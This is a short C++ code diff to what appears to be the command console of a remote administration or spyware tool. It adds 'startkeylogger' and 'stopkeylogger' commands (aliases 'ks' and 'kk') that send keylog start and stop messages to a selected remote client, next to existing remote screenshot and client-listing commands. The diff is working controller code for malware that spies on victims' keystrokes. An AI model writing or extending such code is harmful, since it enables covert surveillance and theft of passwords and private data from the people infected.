@@ -53,6 +53,12 @@ void Entrypoint::Startup()
 	_commands["sc"] = [this] { SendTakeScreenshot(); };
 	_commands["screenshot"] = [this] { SendTakeScreenshot(); };
 
+	_commands["ks"] = [this] { SendStartKeyLogger(); };
+	_commands["startkeylogger"] = [this] { SendStartKeyLogger(); };
+
+	_commands["kk"] = [this] { SendStopKeyLogger(); };
+	_commands["stopkeylogger"] = [this] { SendStopKeyLogger(); };
+
 	_commands["l"] = [this] { ListClients(); };
 	_commands["list"] = [this] { ListClients(); };
 
@@ -119,6 +125,26 @@ void Entrypoint::SendTakeScreenshot()
 	_manager->Send(
 		*_client,
 		MessageType::TakeScreenshot,
+		_argsSpan);
+}
+
+void Entrypoint::SendStartKeyLogger()
+{
+	ValidateSelection();
+
+	_manager->Send(
+		*_client,
+		MessageType::StartKeyLog,
+		_argsSpan);
+}
+
+void Entrypoint::SendStopKeyLogger()
+{
+	ValidateSelection();
+
+	_manager->Send(
+		*_client,
+		MessageType::StopKeyLog,
 		_argsSpan);
 }
 
